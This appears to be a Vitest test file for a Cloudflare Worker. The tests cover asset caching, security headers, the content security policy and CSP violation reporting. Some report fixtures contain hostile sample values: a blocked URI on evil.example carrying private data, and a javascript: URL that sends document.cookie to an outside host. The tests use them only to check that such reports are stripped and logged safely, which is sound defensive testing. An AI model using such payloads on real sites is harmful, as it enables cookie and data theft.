import { describe, expect, it, vi } from 'vitest'
import environments from '../../../config/web-environments.json'
import { MAX_REPORT_BYTES, parseViolations, receiveReport } from './cspReport'
import {
  IMMUTABLE,
  REVALIDATE,
  contentSecurityPolicy,
  headersFile,
  securityHeaders,
  type WebProfile,
} from './headers'
import worker, { type Env } from './worker'

const CHUNK = '/_expo/static/js/web/index-8ee1e5e4af138582a02721ff781b6161.js'
const FILES: Record<string, [string, string]> = {
  '/index.html': ['text/html; charset=utf-8', '<!doctype html>'],
  [CHUNK]: ['text/javascript; charset=utf-8', 'console.log(1)'],
  '/canvaskit.wasm': ['application/wasm', '\0asm'],
  '/assets/src/assets/icon.19556d01c4098119ac9127ac2681a68d.png': [
    'image/png',
    'png',
  ],
}

// Behaves like Cloudflare's asset binding in single-page-application mode:
// anything it doesn't have comes back as index.html with a 200.
const assets = {
  fetch: async (input: Request | string) => {
    const request = typeof input === 'string' ? new Request(input) : input
    const { pathname } = new URL(request.url)
    const [type, body] = FILES[pathname] ?? FILES['/index.html']
    return new Response(request.method === 'HEAD' ? null : body, {
      headers: {
        'Content-Type': type,
        'Cache-Control': REVALIDATE,
        ETag: '"etag"',
      },
    })
  },
} as unknown as Fetcher

const env = (profile = 'dev'): Env => ({
  ASSETS: assets,
  WW_WEB_PROFILE: profile,
})

const call = (path: string, init?: RequestInit, profile?: string) =>
  worker.fetch(
    new Request(`https://app-dev.witnesswork.app${path}`, init) as never,
    env(profile)
  )

const dev = environments.dev as WebProfile

function expectSecurityHeaders(response: Response) {
  for (const [name, value] of Object.entries(securityHeaders(dev)))
    expect(response.headers.get(name)).toBe(value)
}

describe('files the app loads by URL', () => {
  it('serves a chunk with an immutable cache and the security headers', async () => {
    const response = await call(CHUNK)
    expect(response.status).toBe(200)
    expect(response.headers.get('Content-Type')).toMatch(/javascript/)
    expect(response.headers.get('Cache-Control')).toBe(IMMUTABLE)
    expect(response.headers.get('ETag')).toBe('"etag"')
    expect(await response.text()).toBe('console.log(1)')
    expectSecurityHeaders(response)
  })

  it('gives a missing chunk a real 404 instead of index.html', async () => {
    const response = await call('/_expo/static/js/web/index-deadbeef.js')
    expect(response.status).toBe(404)
    expect(response.headers.get('Content-Type')).toBe(
      'text/plain; charset=utf-8'
    )
    expect(response.headers.get('Cache-Control')).toBe('no-store')
    expect(await response.text()).not.toContain('<!doctype')
    expectSecurityHeaders(response)
  })

  it('answers HEAD for a missing file with an empty 404', async () => {
    const response = await call('/assets/missing.png', { method: 'HEAD' })
    expect(response.status).toBe(404)
    expect(await response.text()).toBe('')
  })

  it('keeps unhashed files revalidating', async () => {
    const response = await call('/canvaskit.wasm')
    expect(response.status).toBe(200)
    expect(response.headers.get('Content-Type')).toBe('application/wasm')
    expect(response.headers.get('Cache-Control')).toBe(REVALIDATE)
  })

  it('caches hashed assets for good', async () => {
    const response = await call(
      '/assets/src/assets/icon.19556d01c4098119ac9127ac2681a68d.png'
    )
    expect(response.headers.get('Cache-Control')).toBe(IMMUTABLE)
  })

  it('only reads files', async () => {
    for (const method of ['POST', 'PUT', 'DELETE', 'OPTIONS']) {
      const response = await call(CHUNK, { method })
      expect(response.status).toBe(405)
      expect(response.headers.get('Allow')).toBe('GET, HEAD')
      expectSecurityHeaders(response)
    }
  })

  it('fails closed when the Worker has no known profile', async () => {
    const response = await call(CHUNK, undefined, 'staging')
    expect(response.status).toBe(500)
    expect(await response.text()).toBe('')
  })
})

describe('headers', () => {
  it('limits connections to the profile’s API, PostHog, the website and RevenueCat', () => {
    const csp = contentSecurityPolicy(dev)
    expect(csp).toContain(
      "connect-src 'self' https://api-dev.witnesswork.app wss://api-dev.witnesswork.app https://ww-api-r.leviwilkerson.com https://witnesswork.app https://help-search.witnesswork.app"
    )
    // Browser mode's API and its events; never a RevenueCat or Stripe script.
    expect(csp).toMatch(
      /connect-src [^;]* https:\/\/api\.revenuecat\.com https:\/\/e\.revenue\.cat;/
    )
    expect(csp).not.toMatch(/script-src [^;]*(revenuecat|rev\.cat|stripe)/)
    expect(csp).toContain(
      'frame-src https://maps-dev.witnesswork.app https://challenges.cloudflare.com;'
    )
    expect(csp).toContain(
      "script-src 'self' 'wasm-unsafe-eval' https://challenges.cloudflare.com;"
    )
    expect(csp).toContain("require-trusted-types-for 'script'")
    expect(csp).toMatch(/; report-uri \/_csp-report$/)
    expect(csp).not.toContain('report-to')
    expect(csp).not.toMatch(/ 'unsafe-eval'|\*/)
    const local = contentSecurityPolicy(environments.local as WebProfile)
    expect(local).toContain('http://localhost:8787 ws://localhost:8787')
    for (const profile of ['beta', 'production'] as const) {
      const policy = contentSecurityPolicy(environments[profile] as WebProfile)
      expect(policy).toContain('https://api.witnesswork.app wss://')
      expect(policy).toContain(
        'frame-src https://maps.witnesswork.app https://challenges.cloudflare.com;'
      )
    }
  })

  it('reports violations until an environment switches to enforce', () => {
    for (const profile of Object.values(environments))
      expect(profile.csp).toBe('report-only')
    expect(securityHeaders(dev)).toHaveProperty(
      'Content-Security-Policy-Report-Only'
    )
    expect(securityHeaders(dev)).not.toHaveProperty('Content-Security-Policy')
    const enforced = securityHeaders({ ...dev, csp: 'enforce' })
    expect(enforced['Content-Security-Policy']).toBe(contentSecurityPolicy(dev))
    expect(enforced).not.toHaveProperty('Content-Security-Policy-Report-Only')
  })

  it('hardens the origin without cross-origin isolation', () => {
    const headers = securityHeaders(dev)
    expect(headers).toMatchObject({
      'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
      'X-Content-Type-Options': 'nosniff',
      'Referrer-Policy': 'no-referrer',
      'Cross-Origin-Opener-Policy': 'same-origin',
      'X-Frame-Options': 'DENY',
    })
    expect(headers['Permissions-Policy']).toContain('camera=(self)')
    expect(headers['Permissions-Policy']).toContain('microphone=(self)')
    expect(headers['Permissions-Policy']).toContain('geolocation=(self)')
    expect(headers).not.toHaveProperty('Cross-Origin-Embedder-Policy')
  })

  it('writes the same set into _headers for every asset path', () => {
    const file = headersFile(dev).split('\n')
    expect(file[0]).toBe('/*')
    expect(file.slice(1).filter(Boolean)).toEqual(
      Object.entries(securityHeaders(dev)).map(([n, v]) => `  ${n}: ${v}`)
    )
  })
})

describe('CSP reports', () => {
  const report = (body: unknown, type = 'application/csp-report') =>
    new Request('https://app-dev.witnesswork.app/_csp-report', {
      method: 'POST',
      headers: { 'Content-Type': type },
      body: typeof body === 'string' ? body : JSON.stringify(body),
    })

  it('logs one compact, stripped line per violation and answers 204', async () => {
    const log = vi.fn()
    const response = await receiveReport(
      report({
        'csp-report': {
          'document-uri':
            'https://app-dev.witnesswork.app/accounts/handoff?code=1#secret',
          'violated-directive': 'connect-src',
          'effective-directive': 'connect-src',
          'blocked-uri': 'https://evil.example/collect?data=private',
          'source-file': `https://app-dev.witnesswork.app${CHUNK}?v=1`,
          'line-number': 12,
          'column-number': 3,
          'script-sample': 'private note text',
          disposition: 'report',
        },
      }),
      log
    )
    expect(response.status).toBe(204)
    expect(log).toHaveBeenCalledOnce()
    const line = JSON.parse(log.mock.calls[0][0])
    expect(line).toEqual({
      event: 'csp-violation',
      directive: 'connect-src',
      disposition: 'report',
      blocked: 'https://evil.example/collect',
      document: 'https://app-dev.witnesswork.app/accounts/handoff',
      source: `https://app-dev.witnesswork.app${CHUNK}`,
      line: 12,
      column: 3,
    })
    expect(log.mock.calls[0][0]).not.toMatch(/private|secret|code=/)
  })

  it('reads Reporting API batches and keeps only the Trusted Types sink', () => {
    const violations = parseViolations([
      {
        type: 'csp-violation',
        body: {
          documentURL: 'https://app-dev.witnesswork.app/',
          effectiveDirective: 'require-trusted-types-for',
          blockedURL: 'trusted-types-sink',
          sample: 'Element innerHTML|<p>Visit with Ana at 5</p>',
          disposition: 'report',
        },
      },
      { type: 'deprecation', body: { id: 'x' } },
      {
        type: 'csp-violation',
        body: {
          documentURL: 'https://app-dev.witnesswork.app/',
          effectiveDirective: 'img-src',
          blockedURL: 'data:image/png;base64,AAAA',
          disposition: 'report',
        },
      },
    ])
    expect(violations).toEqual([
      expect.objectContaining({
        directive: 'require-trusted-types-for',
        blocked: 'trusted-types-sink',
        sink: 'Element innerHTML',
      }),
      expect.objectContaining({ directive: 'img-src', blocked: 'data' }),
    ])
    expect(JSON.stringify(violations)).not.toContain('Ana')
  })

  it('keeps only the scheme of URLs that have no origin', () => {
    const blocked = (blockedURL: string) =>
      parseViolations([
        {
          type: 'csp-violation',
          body: {
            documentURL: 'https://app-dev.witnesswork.app/',
            effectiveDirective: 'script-src-elem',
            blockedURL,
          },
        },
      ])[0].blocked
    expect(blocked('mailto:someone@example.com')).toBe('mailto')
    expect(blocked('javascript:fetch("//x/"+document.cookie)')).toBe(
      'javascript'
    )
    expect(blocked('file:///Users/someone/notes.txt')).toBe('file')
    expect(blocked('chrome-extension://abcdef/content.js')).toBe(
      'chrome-extension'
    )
  })

  it('reads the single Reporting API report WebKit posts to report-uri', () => {
    expect(
      parseViolations({
        type: 'csp-violation',
        url: 'https://app-dev.witnesswork.app/',
        body: {
          documentURL: 'https://app-dev.witnesswork.app/',
          effectiveDirective: 'require-trusted-types-for',
          blockedURL: 'trusted-types-sink',
          sample: 'Function|return this',
          disposition: 'report',
        },
      })
    ).toEqual([
      expect.objectContaining({
        directive: 'require-trusted-types-for',
        sink: 'Function',
      }),
    ])
  })

  it('drops reports about other sites and caps each batch', async () => {
    const log = vi.fn()
    const one = (documentURL: string) => ({
      type: 'csp-violation',
      body: {
        documentURL,
        effectiveDirective: 'img-src',
        blockedURL: 'inline',
      },
    })
    await receiveReport(
      report(
        [
          one('https://evil.example/'),
          one('https://app-dev.witnesswork.app.evil.example/'),
          ...Array.from({ length: 50 }, () =>
            one('https://app-dev.witnesswork.app/')
          ),
        ],
        'application/reports+json'
      ),
      log
    )
    expect(log).toHaveBeenCalledTimes(8)
  })

  it('refuses oversized, mistyped, malformed and non-POST reports', async () => {
    const log = vi.fn()
    const big = 'x'.repeat(MAX_REPORT_BYTES + 1)
    expect((await receiveReport(report(big), log)).status).toBe(413)
    const streamed = new Request(
      'https://app-dev.witnesswork.app/_csp-report',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/csp-report' },
        body: new ReadableStream({
          start(controller) {
            for (let i = 0; i < 40; i++)
              controller.enqueue(new TextEncoder().encode('x'.repeat(1024)))
            controller.close()
          },
        }),
        duplex: 'half',
      } as RequestInit
    )
    expect((await receiveReport(streamed, log)).status).toBe(413)
    expect((await receiveReport(report('{}', 'text/plain'), log)).status).toBe(
      415
    )
    expect((await receiveReport(report('{nope'), log)).status).toBe(400)
    const get = await call('/_csp-report')
    expect(get.status).toBe(405)
    expect(get.headers.get('Allow')).toBe('POST')
    expectSecurityHeaders(get)
    expect(log).not.toHaveBeenCalled()
  })

  it('answers through the Worker with the security headers', async () => {
    const response = await call('/_csp-report', {
      method: 'POST',
      headers: { 'Content-Type': 'application/reports+json' },
      body: '[]',
    })
    expect(response.status).toBe(204)
    expectSecurityHeaders(response)
  })
})
